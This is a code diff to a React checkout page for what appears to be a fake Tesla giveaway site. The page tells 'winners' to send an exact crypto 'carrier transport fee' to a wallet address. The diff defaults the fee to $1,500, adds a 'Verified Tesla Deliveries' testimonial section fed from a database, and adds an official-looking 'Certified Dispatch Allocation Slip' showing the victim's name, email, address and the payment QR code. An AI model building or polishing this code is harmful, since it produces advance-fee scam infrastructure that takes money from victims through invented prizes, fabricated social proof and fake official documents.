@@ -20,6 +20,11 @@ import {
   Wallet,
   Zap,
   Loader2,
+  Printer,
+  Download,
+  Star,
+  FileText,
+  X,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -31,9 +36,11 @@ import {
   fetchWalletConfig,
   fetchWalletQrUrls,
   createOrder,
+  fetchTestimonials,
   type DbDrop,
   type DbSiteConfig,
   type DbWalletConfig,
+  type DbTestimonial,
 } from "@/lib/supabase";
 
 export const Route = createFileRoute("/checkout")({
@@ -108,6 +115,17 @@ function CryptoIcon({ coin, size = 18 }: { coin: string; size?: number }) {
   return <Wallet size={size} />;
 }
 
+function formatCleanFee(fee?: string | null): string {
+  if (!fee || !fee.trim()) return "$1,500";
+  let s = fee.trim();
+  if (s.startsWith(",")) {
+    s = "$1" + s;
+  } else if (!s.startsWith("$") && !s.toLowerCase().startsWith("free")) {
+    s = "$" + s;
+  }
+  return s;
+}
+
 function CheckoutPage() {
   const search = Route.useSearch();
   const navigate = useNavigate();
@@ -117,6 +135,8 @@ function CheckoutPage() {
   const [siteConfig, setSiteConfig] = useState<DbSiteConfig | null>(null);
   const [walletConfig, setWalletConfig] = useState<DbWalletConfig | null>(null);
   const [qrUrls, setQrUrls] = useState<{ primaryQr: string; secondaryQr: string }>({ primaryQr: "", secondaryQr: "" });
+  const [testimonials, setTestimonials] = useState<DbTestimonial[]>([]);
+  const [showSlipModal, setShowSlipModal] = useState(false);
 
   const [selectedDropId, setSelectedDropId] = useState<string>(search.dropId || "");
   const [copied, setCopied] = useState(false);
@@ -147,16 +167,28 @@ function CheckoutPage() {
 
   const loadData = useCallback(async () => {
     try {
-      const [d, s, w, q] = await Promise.all([
+      const [d, s, w, q, t] = await Promise.all([
         fetchDrops(),
         fetchSiteConfig(),
         fetchWalletConfig(),
         fetchWalletQrUrls(),
+        fetchTestimonials(),
       ]);
       setDrops(d);
       setSiteConfig(s);
       setWalletConfig(w);
       setQrUrls(q);
+      setTestimonials(t);
+
+      if (s?.icon_url) {
+        let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
+        if (!link) {
+          link = document.createElement("link");
+          link.rel = "icon";
+          document.head.appendChild(link);
+        }
+        link.href = s.icon_url;
+      }
 
       if (w.accepted_coins && w.accepted_coins.length > 0) {
         setCrypto(w.accepted_coins[0]);
@@ -373,8 +405,9 @@ function CheckoutPage() {
       {/* Main Checkout Container */}
       <main className="mx-auto max-w-6xl px-4 sm:px-6 pt-8">
         {submittedOrder ? (
-          /* ── ORDER CONFIRMED VIEW ──────────────────────────────── */
-          <div className="mx-auto max-w-2xl rounded-2xl border border-border bg-card p-6 sm:p-10 shadow-xl">
+          <div className="space-y-12">
+            {/* ── ORDER CONFIRMED VIEW ──────────────────────────────── */}
+            <div className="mx-auto max-w-2xl rounded-2xl border border-border bg-card p-6 sm:p-10 shadow-xl">
             <div className="flex flex-col items-center text-center">
               <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-500 mb-4">
                 <CheckCircle2 size={36} />
@@ -417,7 +450,7 @@ function CheckoutPage() {
                   <p className="text-xs text-muted-foreground">To initiate carrier shipment, transfer fee via {submittedOrder.crypto}</p>
                 </div>
                 <span className="font-mono text-lg font-black text-foreground">
-                  {submittedOrder.fee}
+                  {formatCleanFee(submittedOrder.fee)}
                 </span>
               </div>
 
@@ -476,7 +509,7 @@ function CheckoutPage() {
               </div>
             </div>
 
-            <div className="mt-8 flex flex-col sm:flex-row items-center justify-between gap-3 pt-4 border-t border-border">
+            <div className="mt-8 flex flex-col sm:flex-row items-center justify-between gap-3 pt-4 border-t border-border no-print">
               <Link to="/" className="w-full sm:w-auto">
                 <Button variant="outline" className="w-full rounded-full font-bold h-11">
                   ← Back to Tesla Fleet
@@ -484,13 +517,66 @@ function CheckoutPage() {
               </Link>
               <Button
                 className="w-full sm:w-auto rounded-full font-bold h-11 px-8 shadow-md"
-                onClick={() => window.print()}
+                onClick={() => setShowSlipModal(true)}
               >
-                Print / Save Allocation Slip
+                <Printer size={15} className="mr-1.5" /> Print / Save Allocation Slip
               </Button>
             </div>
           </div>
-        ) : (
+
+          {/* ── TESTIMONIALS OF OTHER RECIPIENTS ─────────────────── */}
+          <div className="mt-12 no-print space-y-6">
+            <div className="text-center space-y-1">
+              <span className="inline-flex items-center gap-1.5 text-xs font-bold uppercase tracking-wider text-emerald-500 bg-emerald-500/10 px-3 py-1 rounded-full">
+                <ShieldCheck size={14} /> Verified Tesla Deliveries
+              </span>
+              <h2 className="text-2xl sm:text-3xl font-serif font-bold text-foreground">
+                Recent Allocation Recipients
+              </h2>
+              <p className="text-xs text-muted-foreground max-w-md mx-auto">
+                Verified recipients who completed carrier transport fee settlement and received vehicle delivery.
+              </p>
+            </div>
+
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              {testimonials.map((t) => (
+                <div key={t.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm space-y-3">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-3">
+                      {t.image_url ? (
+                        <img src={t.image_url} alt={t.name} className="h-10 w-10 rounded-full object-cover border border-border" />
+                      ) : (
+                        <div className="h-10 w-10 rounded-full bg-muted flex items-center justify-center font-bold text-xs">{t.name.charAt(0)}</div>
+                      )}
+                      <div>
+                        <div className="flex items-center gap-1">
+                          <span className="text-xs font-bold text-foreground">{t.name}</span>
+                          <CheckCircle2 size={12} className="text-emerald-500" />
+                        </div>
+                        <span className="text-[10px] text-muted-foreground">{t.location}</span>
+                      </div>
+                    </div>
+                    <div className="flex text-amber-400">
+                      {Array.from({ length: t.rating || 5 }).map((_, i) => (
+                        <Star key={i} size={11} fill="currentColor" />
+                      ))}
+                    </div>
+                  </div>
+
+                  <p className="text-xs text-foreground/85 italic leading-relaxed">
+                    "{t.quote}"
+                  </p>
+
+                  <div className="flex items-center justify-between text-[11px] border-t border-border/50 pt-2 text-muted-foreground">
+                    <span className="font-semibold text-foreground truncate mr-2">{t.vehicle_model}</span>
+                    <span className="text-[9px] bg-muted px-2 py-0.5 rounded shrink-0">Delivered</span>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      ) : (
           /* ── FULL CHECKOUT FORM ────────────────────────────────── */
           <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
             {/* Left Column: Vehicle Summary Card (Sticky) */}
@@ -552,7 +638,7 @@ function CheckoutPage() {
                     <div className="flex items-center justify-between text-xs border-t border-border pt-2">
                       <span className="font-bold text-foreground">Transport & Carrier Fee:</span>
                       <span className="font-mono text-sm font-black text-foreground">
-                        {currentDrop.delivery_fee}
+                        {formatCleanFee(currentDrop.delivery_fee)}
                       </span>
                     </div>
 
@@ -576,7 +662,7 @@ function CheckoutPage() {
                     >
                       {drops.map((d) => (
                         <option key={d.id} value={d.id}>
-                          {d.name} — {d.kind === "giveaway" ? "Free Giveaway" : d.amount} ({d.delivery_fee} delivery)
+                          {d.name} — {d.kind === "giveaway" ? "Free Giveaway" : d.amount} ({formatCleanFee(d.delivery_fee)} delivery)
                         </option>
                       ))}
                     </select>
@@ -760,7 +846,7 @@ function CheckoutPage() {
                       </p>
                     </div>
                     <span className="font-mono text-xs font-bold bg-muted px-2.5 py-1 rounded-full">
-                      Fee: {currentDrop.delivery_fee}
+                      Fee: {formatCleanFee(currentDrop.delivery_fee)}
                     </span>
                   </div>
 
@@ -815,7 +901,7 @@ function CheckoutPage() {
                           className="font-mono text-xs bg-background h-10 select-all"
                         />
                         <p className="text-[10px] text-muted-foreground leading-normal">
-                          Send exactly {currentDrop.delivery_fee} in {crypto} to lock in carrier scheduling. Order record is generated upon submitting.
+                          Send exactly {formatCleanFee(currentDrop.delivery_fee)} in {crypto} to lock in carrier scheduling. Order record is generated upon submitting.
                         </p>
                       </div>
                     </div>
@@ -837,8 +923,8 @@ function CheckoutPage() {
                     ) : (
                       <>
                         {currentDrop.kind === "giveaway"
-                          ? `Confirm Claim & Reserve Spot · ${currentDrop.delivery_fee}`
-                          : `Confirm Purchase & Reserve Spot · ${currentDrop.delivery_fee}`}
+                          ? `Confirm Claim & Reserve Spot · ${formatCleanFee(currentDrop.delivery_fee)}`
+                          : `Confirm Purchase & Reserve Spot · ${formatCleanFee(currentDrop.delivery_fee)}`}
                         <ArrowRight size={16} className="ml-2" />
                       </>
                     )}
@@ -859,6 +945,108 @@ function CheckoutPage() {
           </div>
         )}
       </main>
+
+      {/* ── INTERACTIVE ALLOCATION SLIP MODAL (PRINT/SAVE) ──────── */}
+      {showSlipModal && submittedOrder && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
+          <div className="relative w-full max-w-2xl bg-card border border-border rounded-2xl shadow-2xl p-6 sm:p-8 space-y-6 print-clean-slip">
+            {/* Header with Insignia and Verification */}
+            <div className="flex items-start justify-between border-b-2 border-border pb-5">
+              <div>
+                <span className="font-mono text-[10px] font-black tracking-widest text-emerald-600 dark:text-emerald-400 uppercase">
+                  CERTIFIED DISPATCH ALLOCATION
+                </span>
+                <h2 className="font-serif text-2xl font-black uppercase tracking-tight text-foreground mt-0.5">
+                  Tesla Allocation Slip
+                </h2>
+                <p className="text-xs text-muted-foreground">
+                  Enclosed Carrier Transport Bill of Lading & Allocation Voucher
+                </p>
+              </div>
+              <div className="text-right">
+                <span className="text-[10px] font-bold text-muted-foreground uppercase">Allocation Ref</span>
+                <p className="font-mono text-sm font-black text-foreground">#{submittedOrder.ref}</p>
+                <span className="inline-flex items-center gap-1 text-[10px] text-emerald-500 font-bold">
+                  <CheckCircle2 size={12} /> Priority Locked
+                </span>
+              </div>
+            </div>
+
+            {/* Grid of Allocation Details */}
+            <div className="grid grid-cols-2 gap-4 text-xs">
+              <div className="space-y-1">
+                <span className="text-[10px] font-bold uppercase text-muted-foreground">Allocated Vehicle</span>
+                <p className="font-bold text-sm text-foreground">{submittedOrder.drop.name}</p>
+                <p className="text-[11px] text-muted-foreground">Valuation: {submittedOrder.drop.prize_value}</p>
+              </div>
+
+              <div className="space-y-1">
+                <span className="text-[10px] font-bold uppercase text-muted-foreground">Carrier Transport Window</span>
+                <p className="font-bold text-foreground">Priority Carrier Dispatch (48-72h)</p>
+                <p className="text-[11px] text-emerald-600 dark:text-emerald-400 font-semibold">White-Glove Enclosed Carrier</p>
+              </div>
+            </div>
+
+            {/* Recipient Logistics */}
+            <div className="rounded-xl border border-border bg-muted/40 p-4 space-y-2 text-xs">
+              <div className="flex justify-between border-b border-border/50 pb-1.5">
+                <span className="text-muted-foreground">Registered Recipient:</span>
+                <span className="font-bold text-foreground">{submittedOrder.fullName}</span>
+              </div>
+              <div className="flex justify-between border-b border-border/50 pb-1.5">
+                <span className="text-muted-foreground">Registered Email:</span>
+                <span className="font-bold text-foreground">{submittedOrder.email}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-muted-foreground">Delivery Destination:</span>
+                <span className="font-bold text-foreground text-right max-w-xs">{submittedOrder.address}</span>
+              </div>
+            </div>
+
+            {/* Payment Settlement Information */}
+            <div className="rounded-xl border-2 border-dashed border-border p-4 flex flex-col sm:flex-row items-center gap-4 bg-background">
+              <div className="p-2 rounded-lg bg-white border border-border shrink-0 shadow-2xs">
+                {activeQrImage ? (
+                  <img src={activeQrImage} alt="Payment QR" className="h-20 w-20 object-contain" />
+                ) : (
+                  <QrCode value={submittedOrder.walletAddress} size={80} />
+                )}
+              </div>
+              <div className="flex-1 min-w-0 space-y-1 text-xs">
+                <div className="flex items-center justify-between">
+                  <span className="font-bold text-foreground">Delivery Processing Fee:</span>
+                  <span className="font-mono font-bold text-sm text-foreground">{formatCleanFee(submittedOrder.fee)}</span>
+                </div>
+                <p className="text-[10px] text-muted-foreground">
+                  Send exactly {formatCleanFee(submittedOrder.fee)} in {submittedOrder.crypto} to lock carrier routing:
+                </p>
+                <p className="font-mono text-[10px] break-all bg-muted p-1.5 rounded text-foreground font-semibold">
+                  {submittedOrder.walletAddress}
+                </p>
+              </div>
+            </div>
+
+            {/* Action Buttons (no-print) */}
+            <div className="flex items-center justify-end gap-3 pt-3 border-t border-border no-print">
+              <Button
+                type="button"
+                variant="outline"
+                className="rounded-full font-bold text-xs h-10 px-5 cursor-pointer"
+                onClick={() => setShowSlipModal(false)}
+              >
+                Close Slip
+              </Button>
+              <Button
+                type="button"
+                className="rounded-full font-bold text-xs h-10 px-6 shadow-md cursor-pointer"
+                onClick={() => window.print()}
+              >
+                <Printer size={14} className="mr-1.5" /> Print or Save as PDF
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
